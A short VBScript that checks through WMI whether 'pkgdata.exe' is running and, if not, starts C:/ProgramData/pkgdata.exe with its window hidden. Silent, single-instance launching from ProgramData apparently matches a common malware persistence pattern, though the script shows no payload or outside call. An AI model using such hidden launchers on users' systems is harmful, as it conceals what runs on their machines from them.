Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * from Win32_Process")
For Each objItem in colItems
If objItem.Name = "pkgdata.exe" Then
	WScript.Quit 1
Exit For
End If
Next
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:/ProgramData/pkgdata.exe" & Chr(34), 0
Set WshShell = Nothing